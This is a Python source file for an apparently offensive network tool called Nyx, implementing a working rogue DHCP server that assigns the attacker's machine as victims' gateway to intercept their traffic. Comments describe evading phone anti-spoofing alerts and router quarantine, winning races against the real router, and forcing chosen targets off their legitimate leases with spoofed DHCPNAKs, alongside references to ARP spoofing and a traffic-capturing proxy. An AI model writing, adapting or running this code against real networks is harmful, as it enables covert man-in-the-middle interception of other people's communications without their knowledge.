import ipaddress
import logging
import platform
import socket
import subprocess
import threading
import time

logger = logging.getLogger(__name__)


def _hex_mask_to_dotted(hexstr: str) -> str:
    """Convert a hex netmask (e.g. 0xffffff00) to dotted-quad form."""
    try:
        val = int(hexstr, 16)
        return ".".join(str((val >> (8 * i)) & 0xFF) for i in range(3, -1, -1))
    except Exception:
        return "255.255.255.0"


def detect_subnet_mask(local_ip: str | None = None) -> str:
    """Best-effort detection of the LAN subnet mask (/24 fallback).

    The mask controls the lease the rogue DHCP server offers; most home/SOHO
    networks are /24, so a failed detection is not fatal.
    """
    sys_platform = platform.system().lower()
    try:
        if sys_platform == "windows":
            out = subprocess.check_output("ipconfig", shell=True, timeout=5).decode("utf-8", errors="replace")
            lines = out.splitlines()
            for i, line in enumerate(lines):
                if local_ip and local_ip in line:
                    for j in range(i, min(i + 8, len(lines))):
                        if "Subnet Mask" in lines[j]:
                            parts = lines[j].split(":")
                            if len(parts) >= 2:
                                return parts[-1].strip().strip()
        elif sys_platform == "linux":
            out = subprocess.check_output("ip -o -f inet addr show", shell=True, timeout=5).decode("utf-8", errors="replace")
            for tok in out.split():
                if local_ip and tok.startswith(local_ip + "/"):
                    cidr = tok.split("/")[1]
                    return str(ipaddress.IPv4Network(f"0.0.0.0/{cidr}", strict=False).netmask)
        else:  # darwin / other unix
            out = subprocess.check_output("ifconfig", shell=True, timeout=5).decode("utf-8", errors="replace")
            for line in out.splitlines():
                parts = line.split()
                for k, p in enumerate(parts):
                    if p == "netmask" and k + 1 < len(parts):
                        m = parts[k + 1]
                        return _hex_mask_to_dotted(m) if m.lower().startswith("0x") else m
    except Exception as e:
        logger.debug("Subnet mask detection failed: %s", e)
    return "255.255.255.0"


class DHCPSpoofer:
    """Rogue DHCP server: assigns THIS machine as the client's default
    gateway, so devices join the MITM *legitimately* — no ARP spoofing, no
    "suspicious activity" warnings on modern phones (the gateway MAC stays
    consistent because the ARP for our IP is genuine).

    Compared to ARP poisoning this is invisible to client-side anti-spoofing
    (Android/iOS show a "network not secure" alert the moment they see two
    ARP replies for the same gateway IP) and triggers no router quarantine.

    The client's DNS is left pointing at the real router (deterministic
    resolution); all TCP goes through us via the gateway assignment, where
    the transparent proxy captures it.

    Caveat: a device only (re)acquires a lease on new WiFi connect or lease
    renewal — reconnect the target's WiFi once Nyx is offering.
    """

    def __init__(
        self,
        gateway_ip: str,
        dns_ip: str | None = None,
        subnet_mask: str = "255.255.255.0",
        lease_seconds: int = 86400,
        target_macs: set[str] | None = None,
    ):
        self.gateway_ip = gateway_ip
        self.dns_ip = dns_ip or gateway_ip
        self.subnet_mask = subnet_mask
        self.lease_seconds = lease_seconds
        # MACs we are allowed to "kick" (DHCPNAK) — filled asynchronously by the
        # caller. Devices NOT in this set are left alone: their renewals to the
        # real router are never disrupted.
        self.target_macs = target_macs or set()
        self._stop_evt = threading.Event()
        self._thread: threading.Thread | None = None
        self._sock: socket.socket | None = None
        self._tx_sock: socket.socket | None = None
        self._bound = threading.Event()
        self._bind_error: str | None = None
        # Post-stop heal responder state (see start_heal_responder).
        self._heal_thread: threading.Thread | None = None
        self._heal_stop = threading.Event()
        self.healed_leases: int = 0
        # How many OFFER/ACK packets were actually sent — lets the UI tell
        # whether the target ever asked for a lease (0 = didn't reconnect).
        self.offers_sent: int = 0
        # How many times the target explicitly requested a lease FROM US
        # (REQUEST with server_id == Nyx, or an INIT-REBOOT broadcast REQUEST).
        # > 0 means the DHCP path converted: the target legitimately routes
        # through Nyx as its gateway — no ARP fallback needed.
        self.lease_requests: int = 0
        # Leases actually granted: [{"mac", "ip", "ts"}] — lets the ARP spoofer
        # follow the target's NEW address after a DHCP takeover.
        self.granted_leases: list[dict] = []
        # DHCPNAKs sent to force a renewing target back to a fresh DISCOVER.
        self.naks_sent: int = 0

    def _network(self) -> ipaddress.IPv4Network:
        return ipaddress.IPv4Network(
            f"{self.gateway_ip}/{self.subnet_mask}", strict=False
        )

    def _pick_ip(self, requested: str | None, mac: str | None = None) -> str:
        """Pick a lease address for a client.

        ``requested`` is honored when valid AND not already leased to a
        DIFFERENT client — two intercepted devices must never receive the
        same address (the naive implementation handed every target the same
        network+10 candidate, causing an IP conflict between targets).
        """
        net = self._network()
        taken_by_others = {
            l["ip"] for l in self.granted_leases if mac is None or l.get("mac") != mac
        }
        if requested:
            try:
                ip = ipaddress.IPv4Address(requested)
                if (
                    ip in net
                    and str(ip) != self.gateway_ip
                    and str(ip) not in taken_by_others
                ):
                    return str(ip)
            except Exception:
                pass
        # Deterministic low-risk scan from the bottom of the range (routers
        # usually assign from the top), skipping the gateway and any address
        # already granted to another client.
        base = int(net.network_address)
        for offset in range(10, 250):
            candidate = ipaddress.IPv4Address(base + offset)
            cand_str = str(candidate)
            if cand_str == self.gateway_ip or cand_str in taken_by_others:
                continue
            return cand_str
        return str(ipaddress.IPv4Address(base + 10))

    def _broadcast(self) -> str:
        return str(self._network().broadcast_address)

    async def start(self) -> bool:
        """Start the rogue DHCP server. Returns True once UDP/67 is bound."""
        if self._thread and self._thread.is_alive():
            return self._bound.is_set()
        self._stop_evt.clear()
        self._bound.clear()
        self._bind_error = None
        self._thread = threading.Thread(
            target=self._serve, daemon=True, name="nyx-dhcp-spoofer"
        )
        self._thread.start()
        import asyncio
        # Give the thread a moment to attempt the UDP/67 bind before reporting
        # status — callers need to know whether it actually bound (vs. silently
        # logging and dying, which would leave the target blackholed).
        for _ in range(20):
            if self._bound.is_set() or self._bind_error:
                break
            await asyncio.sleep(0.05)
        if self._bind_error:
            logger.error("Rogue DHCP failed to start: %s", self._bind_error)
            return False
        if self._bound.is_set():
            logger.info(
                "Rogue DHCP active on 0.0.0.0:67 — gateway=%s (dns=%s, lease=%ds)",
                self.gateway_ip, self.dns_ip, self.lease_seconds,
            )
            return True
        logger.warning("Rogue DHCP did not confirm UDP/67 bind in time")
        return False

    async def stop(self):
        self._stop_evt.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None
        logger.info("Rogue DHCP stopped")
        # Clients still hold a lease naming US as gateway. Start the bounded
        # heal responder so their next renewal is NAKed back to the real
        # router instead of blackholing until the lease expires. Nothing to
        # heal if no lease was ever granted.
        if self.granted_leases:
            self.start_heal_responder()

    def _heal_handle(self, sock: "socket.socket", data: bytes, known_macs: set[str]) -> None:
        """Handle one packet in heal mode: NAK only renewals of OUR leases."""
        msg = self._parse_message(data)
        if not msg["valid"] or msg["type"] != 3:  # REQUEST only
            return
        server_id = msg.get("server_id")
        is_our_renewal = server_id == self.gateway_ip or (
            server_id is None and msg["mac"] in known_macs
        )
        if not is_our_renewal or msg["mac"] not in known_macs:
            return
        reply = self._build_reply(msg, 6, None)  # DHCPNAK
        if not reply:
            return
        try:
            sock.sendto(reply, ("255.255.255.255", 68))
            self.healed_leases += 1
            logger.info(
                "DHCP heal: NAK -> %s (%s) — forced back to the real router",
                msg["mac"], msg.get("hostname") or "?",
            )
        except OSError:
            pass

    def start_heal_responder(self, grace_seconds: int = 600) -> None:
        """Post-stop lease healing (bounded).

        After interception stops, every granted client still routes via Nyx
        with a live lease. At T1 (= lease/2) the client UNICASTS its renewal
        to the server that issued it — us. Nobody answering means the client
        keeps retrying until T2 and only then broadcasts to the real router:
        minutes-to-hours of blackhole on the target.

        This responder binds UDP/67 for ``grace_seconds`` and answers ONLY
        renewal REQUESTs that name us as server (or INIT-REBOOT requests from
        known clients) with a DHCPNAK, which forces an immediate fresh
        DISCOVER — the real router wins it and the target recovers in
        seconds. DISCOVER is NEVER answered here: after stop, new devices
        must never be hijacked.
        """
        if self._heal_thread and self._heal_thread.is_alive():
            return
        self._heal_stop.clear()
        known_macs = self.target_macs | {l["mac"] for l in self.granted_leases}
        deadline = time.time() + grace_seconds

        def _heal():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind(("0.0.0.0", 67))
                sock.settimeout(1.0)
            except OSError as e:
                logger.warning("DHCP heal responder could not bind UDP/67 (%s) — recovery falls back to the client's own rebind timer", e)
                return
            logger.info(
                "DHCP heal responder active for %ds — NAKing renewals of %d known client(s)",
                grace_seconds, len(known_macs),
            )
            try:
                while not self._heal_stop.is_set() and time.time() < deadline:
                    try:
                        data, _addr = sock.recvfrom(4096)
                    except socket.timeout:
                        continue
                    except OSError:
                        break
                    self._heal_handle(sock, data, known_macs)
            finally:
                try:
                    sock.close()
                except OSError:
                    pass
                logger.info("DHCP heal responder finished (healed=%d)", self.healed_leases)

        self._heal_thread = threading.Thread(
            target=_heal, daemon=True, name="nyx-dhcp-heal"
        )
        self._heal_thread.start()

    def _serve(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", 67))
            self._sock = sock
            self._bound.set()
            # Pre-create the reply socket ONCE, bound to our LAN IP, so every
            # OFFER/ACK goes out of OUR interface (a multi-interface PC can
            # otherwise broadcast from a VirtualBox/VPN adapter) and replies
            # stay fast enough to beat the real router to the client.
            #
            # WINDOWS: do NOT create this second socket. On Windows a second
            # SO_REUSEADDR bind on the same UDP port STEALS the port from the
            # socket bound first — the DISCOVER socket above would stop
            # receiving anything and the rogue DHCP server would silently do
            # nothing (offers_sent stays 0, the UI keeps saying "no lease").
            # Replies are then sent through the rx socket; the kernel picks
            # the source IP from the route to the broadcast (the LAN
            # interface in the common case).
            if platform.system().lower() != "windows":
                try:
                    tx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    tx.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    tx.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    tx.bind((self.gateway_ip, 67))
                    self._tx_sock = tx
                except OSError as e:
                    logger.warning(
                        "Could not bind DHCP reply socket to %s — replies may use the wrong interface (%s)",
                        self.gateway_ip, e,
                    )
        except PermissionError:
            self._bind_error = "DHCP server requires admin privileges — run Nyx as Administrator"
            logger.error(self._bind_error)
            return
        except OSError as e:
            self._bind_error = f"Cannot bind UDP/67 (another DHCP service?): {e}"
            logger.error(self._bind_error)
            return
        # No scapy in this thread on purpose: parsing and building are done by
        # hand (struct-free), so the very first DISCOVER from a reconnecting
        # phone is answered with zero import/dissection overhead — the real
        # router (inside the AP) answers in milliseconds and the client keeps
        # the first OFFER.
        try:
            while not self._stop_evt.is_set():
                try:
                    data, addr = sock.recvfrom(4096)
                except OSError:
                    break
                self._handle(data, addr)
        finally:
            self._sock = None
            if self._tx_sock is not None:
                try:
                    self._tx_sock.close()
                except OSError:
                    pass
                self._tx_sock = None

    @staticmethod
    def _parse_message(data: bytes) -> dict:
        """Parse a BOOTP/DHCP payload as delivered by a UDP socket.

        CRITICAL: a UDP socket delivers ONLY the UDP payload (BOOTP+DHCP),
        never the IP header. Dissecting the payload with ``IP(data)`` silently
        rejects every real DISCOVER (offers_sent stays 0 and nothing is ever
        intercepted). Validate the BOOTP op field and the DHCP magic cookie,
        then dissect BOOTP directly.

        Parsed manually (struct-free) on purpose: this runs on the OFFER-race
        hot path, and ``from scapy.all import ...`` + scapy dissection costs
        milliseconds the real router (inside the AP) does not spend.
        """
        msg = {"valid": False, "type": None, "xid": None, "mac": None,
               "requested_ip": None, "server_id": None, "client_ip": None,
               "hostname": None, "flags": 0}
        # BOOTP fixed header is 236 bytes; the DHCP magic cookie must follow.
        if len(data) < 240 or data[236:240] != b"\x63\x82\x53\x63":
            return msg
        if data[0] not in (1, 2):  # BOOTREQUEST / BOOTREPLY
            return msg
        msg["valid"] = True
        msg["xid"] = int.from_bytes(data[4:8], "big")
        msg["mac"] = data[28:34].hex(":")
        msg["flags"] = int.from_bytes(data[10:12], "big")
        ciaddr = ipaddress.IPv4Address(data[12:16])
        msg["client_ip"] = str(ciaddr) if str(ciaddr) != "0.0.0.0" else None
        # DHCP options (RFC 2132): code(1) len(1) value(len), pad=0, end=255.
        opts: dict = {}
        i = 240
        n = len(data)
        while i < n:
            code = data[i]
            if code == 0:
                i += 1
                continue
            if code == 255:
                break
            if i + 1 >= n:
                break
            ln = data[i + 1]
            i += 2
            if i + ln > n:
                break
            opts[code] = data[i:i + ln]
            i += ln
        mt = opts.get(53)
        if isinstance(mt, bytes) and mt:
            msg["type"] = mt[0]
        ro = opts.get(50)
        if isinstance(ro, bytes) and len(ro) == 4:
            msg["requested_ip"] = str(ipaddress.IPv4Address(ro))
        si = opts.get(54)
        if isinstance(si, bytes) and len(si) == 4:
            msg["server_id"] = str(ipaddress.IPv4Address(si))
        hn = opts.get(12)
        if isinstance(hn, bytes):
            msg["hostname"] = hn.decode("utf-8", errors="replace")
        return msg

    @staticmethod
    def _ip4(ip: str) -> bytes:
        return int(ipaddress.IPv4Address(ip)).to_bytes(4, "big")

    def _bootp_header(self, msg: dict, mac_bytes: bytes) -> bytearray:
        """236-byte BOOTP header (op, htype, hlen, xid, flags, ciaddr,
        yiaddr=0, siaddr, giaddr, chaddr + zero padding)."""
        buf = bytearray(236)
        buf[0] = 2  # BOOTREPLY
        buf[1] = 1  # htype: Ethernet
        buf[2] = 6  # hlen
        buf[4:8] = int(msg["xid"]).to_bytes(4, "big")
        buf[10:12] = (msg.get("flags") or 0).to_bytes(2, "big")
        # ciaddr = 0.0.0.0 (offset 12), yiaddr left 0 until filled, giaddr 0.
        buf[20:24] = self._ip4(self.gateway_ip)  # siaddr
        buf[28:34] = mac_bytes
        return buf

    def _build_reply(self, msg: dict, msg_type: int, yiaddr: str | None = None) -> bytes | None:
        """Build the BOOTP/DHCP payload of an OFFER/ACK/NAK.

        IMPORTANT: returns ONLY the BOOTP+DHCP payload, NOT a full IP packet.
        The payload is sent through the UDP socket (``sendto``), so the kernel
        builds the IP/UDP headers itself (src = our LAN IP, sport=67,
        dport=68). Sending a pre-built IP packet through a SOCK_DGRAM socket
        would nest an IP header inside the UDP payload — a malformed packet
        that every DHCP client silently drops (nothing gets intercepted).

        ``yiaddr=None`` builds a DHCPNAK (RFC 2131 §4.3.2): no offered address,
        minimal options — a client that receives a NAK must drop its lease and
        restart with a fresh DISCOVER.
        """
        try:
            mac_bytes = bytes.fromhex(msg["mac"].replace(":", ""))
        except Exception:
            return None
        if len(mac_bytes) != 6:
            return None
        buf = self._bootp_header(msg, mac_bytes)
        if yiaddr is not None:
            buf[16:20] = self._ip4(yiaddr)
        opts = bytearray()

        def opt(code: int, val: bytes):
            opts.append(code)
            opts.append(len(val))
            opts.extend(val)

        opt(53, bytes([msg_type]))
        opt(54, self._ip4(self.gateway_ip))  # server-identifier
        if yiaddr is not None:
            opt(1, self._ip4(self.subnet_mask))
            opt(3, self._ip4(self.gateway_ip))  # router = Nyx
            opt(6, self._ip4(self.dns_ip))  # option 6 = DNS servers
            opt(28, self._ip4(self._broadcast()))
            opt(51, self.lease_seconds.to_bytes(4, "big"))
            opt(58, max(300, self.lease_seconds // 2).to_bytes(4, "big"))
            opt(59, max(450, self.lease_seconds * 3 // 4).to_bytes(4, "big"))
        opts.append(255)
        return bytes(buf) + b"\x63\x82\x53\x63" + bytes(opts)

    def _send_nak(self, msg: dict) -> None:
        """Force a renewing/rebinding TARGET back to INIT (RFC 2131 §4.3.2):
        a DHCPNAK makes the client drop its lease and broadcast a fresh
        DISCOVER — which we can answer (and win, if the target's traffic is
        being dropped/redirected). Only targets in ``target_macs`` are ever
        NAKed, so other devices' renewals are never disrupted."""
        reply = self._build_reply(msg, 6, None)
        if not reply:
            return
        tx = self._tx_sock or self._sock
        if tx is None:
            return
        try:
            tx.sendto(reply, ("255.255.255.255", 68))
            self.naks_sent += 1
            logger.info(
                "DHCP NAK -> %s (%s) — forced back to DISCOVER",
                msg["mac"], msg.get("hostname") or "?",
            )
        except OSError as e:
            logger.warning("DHCP NAK send failed: %s", e)

    def _handle(self, data: bytes, addr) -> None:
        try:
            msg = self._parse_message(data)
            if not msg["valid"]:
                return
            mt = msg["type"]
            if mt == 1:
                logger.info(
                    "DHCP DISCOVER from %s (%s) — sending OFFER (gw=%s)",
                    msg["mac"], msg.get("hostname") or "?", self.gateway_ip,
                )
            elif mt == 3:
                logger.info(
                    "DHCP REQUEST from %s (%s) server_id=%s",
                    msg["mac"], msg.get("hostname") or "?", msg["server_id"],
                )
            else:
                return
            if not msg["xid"]:
                return
            if mt == 3:
                if msg["server_id"] in (self.gateway_ip, None):
                    # server_id == us: the client accepted OUR offer and asks
                    # us for the lease (or an INIT-REBOOT broadcast REQUEST
                    # with no server — any valid ACK is accepted). Grant it.
                    self.lease_requests += 1
                    kind = "ack"
                    reply_type = 5
                else:
                    # REQUEST for the REAL router: a renewal/rebinding of the
                    # existing lease. Toggling Wi-Fi produces exactly this —
                    # the phone keeps its cached lease and renews it with the
                    # router, so Nyx never intercepts anything. For OUR targets
                    # we NAK it (RFC 2131: client must restart with a DISCOVER);
                    # other devices are left untouched.
                    if msg["mac"] in self.target_macs:
                        self._send_nak(msg)
                    else:
                        logger.info(
                            "DHCP REQUEST from %s is a renewal to router %s (not "
                            "us) — ignoring. Forget the Wi-Fi network on the "
                            "phone to force a fresh DISCOVER.",
                            msg["mac"], msg["server_id"],
                        )
                    return
            else:
                kind = "offer"
                reply_type = 2
            yiaddr = msg["client_ip"] if mt == 3 and msg["client_ip"] else self._pick_ip(msg["requested_ip"], msg["mac"])
            reply = self._build_reply(msg, reply_type, yiaddr)
            if not reply:
                return
            tx = self._tx_sock or self._sock
            if tx is None:
                return
            # Payload-only reply: the kernel prepends the correct IP/UDP
            # headers (src = our LAN IP, sport=67, dport=68).
            tx.sendto(reply, ("255.255.255.255", 68))
            self.offers_sent += 1
            if kind == "ack":
                self.granted_leases.append(
                    {"mac": msg["mac"], "ip": yiaddr, "ts": time.time()}
                )
            logger.info(
                "DHCP %s -> %s (%s) ip=%s gw=%s",
                kind, msg["mac"], msg.get("hostname") or "?", yiaddr, self.gateway_ip,
            )
        except Exception as e:
            logger.warning("DHCP handle error: %s", e)